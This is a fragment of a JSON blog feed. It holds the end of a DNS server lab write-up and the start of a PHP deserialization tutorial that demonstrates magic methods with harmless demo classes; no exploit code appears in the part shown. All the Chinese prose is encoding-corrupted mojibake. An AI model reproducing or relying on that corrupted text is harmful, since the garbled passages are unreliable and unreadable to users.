/></p>\n<p>è¿™é‡Œæ˜¯é˜²ç«å¢™ç­–ç•¥è®¾ç½®é—®é¢˜</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161959246.png\" alt=\"image-20221103161959246\" /></p>\n<p>å°† DNS æœåŠ¡åŠ å…¥é˜²ç«å¢™è®¾ç½®ç­–ç•¥ä¸­ï¼Œå†è¿›è¡Œæµ‹è¯•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162110067.png\" alt=\"image-20221103162110067\" /></p>\n<p>ä½¿ç”¨ dig å‘½ä»¤æµ‹è¯•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162313264.png\" alt=\"image-20221103162313264\" /></p>\n<p>åå‘è§£æ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162349247.png\" alt=\"image-20221103162349247\" /></p>\n<h4 id=\"22-è¾…åŠ©dnsæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#22-è¾…åŠ©dnsæœåŠ¡å™¨é…ç½®\">#</a> 2.2 è¾…åŠ© DNS æœåŠ¡å™¨é…ç½®</h4>\n<h5 id=\"221-ä¸»dnsæœåŠ¡å™¨çš„ä¿®æ”¹\"><a class=\"anchor\" href=\"#221-ä¸»dnsæœåŠ¡å™¨çš„ä¿®æ”¹\">#</a> 2.2.1 ä¸» DNS æœåŠ¡å™¨çš„ä¿®æ”¹</h5>\n<p>ä¿®æ”¹ä¸»é…ç½®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162803420.png\" alt=\"image-20221103162803420\" /></p>\n<p>ä¿®æ”¹ä¸»è§£ææ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163107221.png\" alt=\"image-20221103163107221\" /></p>\n<p>ä¿®æ”¹åå‘è§£ææ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163256050.png\" alt=\"image-20221103163256050\" /></p>\n<p>é‡å¯æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163349204.png\" alt=\"image-20221103163349204\" /></p>\n<h5 id=\"222-è¾…åŠ©dnsæœåŠ¡å™¨çš„ä¿®æ”¹\"><a class=\"anchor\" href=\"#222-è¾…åŠ©dnsæœåŠ¡å™¨çš„ä¿®æ”¹\">#</a> 2.2.2 è¾…åŠ© DNS æœåŠ¡å™¨çš„ä¿®æ”¹</h5>\n<p>ä¿®æ”¹ä¸»é…ç½®æ–‡ä»¶ï¼ˆå’Œä¸» DNS ä¸€æ ·ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164025601.png\" alt=\"image-20221103164025601\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164042746.png\" alt=\"image-20221103164042746\" /></p>\n<p>é…ç½®åŒºåŸŸæ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103165149281.png\" alt=\"image-20221103165149281\" /></p>\n<h5 id=\"223æµ‹è¯•\"><a class=\"anchor\" href=\"#223æµ‹è¯•\">#</a> 2.2.3 æµ‹è¯•</h5>\n<p>è¾…åŠ© dns</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171115638.png\" alt=\"image-20221103171115638\" /></p>\n<p>Linux å®¢æˆ·ç«¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171236892.png\" alt=\"image-20221103171236892\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171227238.png\" alt=\"image-20221103171227238\" /></p>\n<h3 id=\"3å®éªŒå°ç»“\"><a class=\"anchor\" href=\"#3å®éªŒå°ç»“\">#</a> 3. å®éªŒå°ç»“</h3>\n<p>æœ¬æ¬¡å®éªŒä¸»è¦å®è·µäº† DNS æœåŠ¡å™¨çš„é…ç½®ï¼Œå¤ä¹ äº† dig çš„ä½¿ç”¨ï¼Œå­¦ä¼šäº† nslookup çš„ä½¿ç”¨</p>\n",
            "tags": [
                "ç½‘ç»œæœåŠ¡åº”ç”¨",
                "DNSæœåŠ¡å™¨"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "phpååºåˆ—åŒ–",
            "date_published": "2022-11-01T16:00:00.000Z",
            "content_html": "<h2 id=\"å‰è¨€\"><a class=\"anchor\" href=\"#å‰è¨€\">#</a> å‰è¨€</h2>\n<p>php æ–‡ä»¶åœ¨æ‰§è¡Œåå¯¹è±¡å¯¹è±¡ä¼šè¢«é”€æ¯ï¼Œä½†æ˜¯è¿™ä¸ªå¯¹è±¡å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬æƒ³è¦æŒç»­çš„ä½¿ç”¨ï¼Œåºåˆ—åŒ–å°±æ˜¯è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ï¼Œé€šè¿‡åºåˆ—åŒ–æˆ‘ä»¬å¯ä»¥å°†å¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²å­˜åˆ°ç£ç›˜ä¸­é•¿æœŸä¿å­˜</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125;\n\nO:è¡¨ç¤ºåºåˆ—åŒ–çš„äº‹å¯¹è±¡\n&lt; length&gt;:è¡¨ç¤ºåºåˆ—åŒ–çš„ç±»åç§°é•¿åº¦\n&lt; class name&gt;ï¼šè¡¨ç¤ºåºåˆ—åŒ–çš„ç±»çš„åç§°\n&lt; n &gt;:è¡¨ç¤ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„å˜é‡ä¸ªæ•°\n&lt; field name 1&gt;ï¼šå±æ€§å\n&lt; field value 1&gt;ï¼šå±æ€§å€¼<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O:4:\"demo\":2:&#123;s:5:\"clown\";s:5:\"joker\";s:4:\"test\";s:4:\"test\";&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031204530320.png\" alt=\"image-20221031204530320\" /></p>\n<h2 id=\"é­”æœ¯æ–¹æ³•\"><a class=\"anchor\" href=\"#é­”æœ¯æ–¹æ³•\">#</a> é­”æœ¯æ–¹æ³•</h2>\n<h3 id=\"__constructæ„é€ å‡½æ•°\"><a class=\"anchor\" href=\"#__constructæ„é€ å‡½æ•°\">#</a> __construct ()ï¼Œæ„é€ å‡½æ•°</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031204826374.png\" alt=\"image-20221031204826374\" /></p>\n<p>è¿™ä¸ªå‡½æ•°åœ¨ç±»è¢«å®ä¾‹åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨</p>\n<h3 id=\"__destructææ„å‡½æ•°\"><a class=\"anchor\" href=\"#__destructææ„å‡½æ•°\">#</a> __destruct ()ï¼Œææ„å‡½æ•°</h3>\n<p>å½“ç±»è¢«åˆ é™¤å‰ä¼šè‡ªåŠ¨è°ƒç”¨</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"æ„é€ å‡½æ•°\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ææ„å‡½æ•°\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031205700467.png\" alt=\"image-20221031205700467\" /></p>\n<h3 id=\"__callè°ƒç”¨ä¸å¯è°ƒç”¨çš„æ–¹æ³•\"><a class=\"anchor\" href=\"#__callè°ƒç”¨ä¸å¯è°ƒç”¨çš„æ–¹æ³•\">#</a> __call ()ï¼Œè°ƒç”¨ä¸å¯è°ƒç”¨çš„æ–¹æ³•</h3>\n<p>è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° $function_name ä¼šè‡ªåŠ¨æ¥æ”¶ä¸å­˜åœ¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ª $arguments åˆ™ä»¥æ•°ç»„çš„æ–¹å¼æ¥æ”¶ä¸å­˜åœ¨æ–¹æ³•çš„å¤šä¸ªå‚æ•°</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"æ„é€ å‡½æ•°\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ææ„å‡½æ•°\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$arguments</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'$name='</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'arguments='</span><span class=\"token operator\">.</span><span class=\"token variable\">$arguments</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031210134723.png\" alt=\"image-20221031210134723\" /></p>\n<h3 id=\"__callstaticç”¨é™æ€æ–¹å¼è°ƒç”¨ä¸€ä¸ªä¸å¯è°ƒç”¨æ–¹æ³•æ—¶è°ƒç”¨\"><a class=\"anchor\" href=\"#__callstaticç”¨é™æ€æ–¹å¼è°ƒç”¨ä¸€ä¸ªä¸å¯è°ƒç”¨æ–¹æ³•æ—¶è°ƒç”¨\">#</a> __callStatic ()ï¼Œç”¨é™æ€æ–¹å¼è°ƒç”¨ä¸€ä¸ªä¸å¯è°ƒç”¨æ–¹æ³•æ—¶è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">æ­¤æ–¹æ³•ä¸ä¸Šé¢æ‰€è¯´çš„ __call() åŠŸèƒ½é™¤äº† __callStatic() æ˜¯ä¸ºé™æ€æ–¹æ³•å‡†å¤‡çš„ä¹‹å¤–ï¼Œå…¶å®ƒéƒ½æ˜¯ä¸€æ ·çš„ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"__getè·å¾—ä¸€ä¸ªç±»çš„ç§æœ‰æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨\"><a class=\"anchor\" href=\"#__getè·å¾—ä¸€ä¸ªç±»çš„ç§æœ‰æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨\">#</a> __get ()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„ç§æœ‰æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'get$n'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$n</span></span>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">clown</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211102996.png\" alt=\"image-20221031211102996\" /></p>\n<h3 id=\"__setè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨\"><a class=\"anchor\" href=\"#__setè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨\">#</a> __setï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡çš„æ—¶å€™è°ƒç”¨</h3>\n<p>__set ($property, $value) æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œ ç»™ä¸€ä¸ªæœªå®šä¹‰çš„å±æ€§èµ‹å€¼æ—¶ï¼Œæ­¤æ–¹æ³•ä¼šè¢«è§¦å‘ï¼Œä¼ é€’çš„å‚æ•°æ˜¯è¢«è®¾ç½®çš„å±æ€§åå’Œå€¼ï¼Œå‚æ•° <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mtext>æ˜¯è¦æ“ä½œçš„å˜é‡åç§°ï¼Œ</mtext></mrow><annotation encoding=\"application/x-tex\">key æ˜¯è¦æ“ä½œçš„å˜é‡åç§°ï¼Œ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord cjk_fallback\">æ˜¯</span><span class=\"mord cjk_fallback\">è¦</span><span class=\"mord cjk_fallback\">æ“</span><span class=\"mord cjk_fallback\">ä½œ</span><span class=\"mord cjk_fallback\">çš„</span><span class=\"mord cjk_fallback\">å˜</span><span class=\"mord cjk_fallback\">é‡</span><span class=\"mord cjk_fallback\">å</span><span class=\"mord cjk_fallback\">ç§°</span><span class=\"mord cjk_fallback\">ï¼Œ</span></span></span></span>value ä¸ºå˜é‡ $key çš„å€¼</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Setting <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span> to <span class=\"token interpolation\"><span class=\"token variable\">$value</span></span>\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"clown\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">test</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"demo\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211605290.png\" alt=\"image-20221031211605290\" /></p>\n<h3 id=\"__issetä¸å¯è®¿é—®æˆ–è€…ä¸å­˜åœ¨å±æ€§è°ƒç”¨issetæˆ–emptyæ—¶è°ƒç”¨\"><a class=\"anchor\" href=\"#__issetä¸å¯è®¿é—®æˆ–è€…ä¸å­˜åœ¨å±æ€§è°ƒç”¨issetæˆ–emptyæ—¶è°ƒç”¨\">#</a> __isset ()ï¼Œä¸å¯è®¿é—®æˆ–è€…ä¸å­˜åœ¨å±æ€§è°ƒç”¨ isset () æˆ– empty () æ—¶è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">&lt;?php\nerror_reporting(0);\nclass demo&#123;\n    public $clown&#x3D;&quot;joker&quot;;\n    private $test &#x3D; &quot;test&quot;;\n    function __isset($name)&#123;\n        echo &quot;isset-&gt;$name\\n&quot;;\n    &#125;\n&#125;\n$a&#x3D;new demo();\nisset($a-&gt;clown);\nisset($a-&gt;test);\necho serialize($a).&quot;\\n&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031211913408.png\" alt=\"image-20221031211913408\" /></p>\n<h3 id=\"__sleepåºåˆ—åŒ–çš„æ—¶å€™ä¼˜å…ˆè°ƒç”¨\"><a class=\"anchor\" href=\"#__sleepåºåˆ—åŒ–çš„æ—¶å€™ä¼˜å…ˆè°ƒç”¨\">#</a> __sleep ()ï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼˜å…ˆè°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"sleeping\\n\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"clown\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" 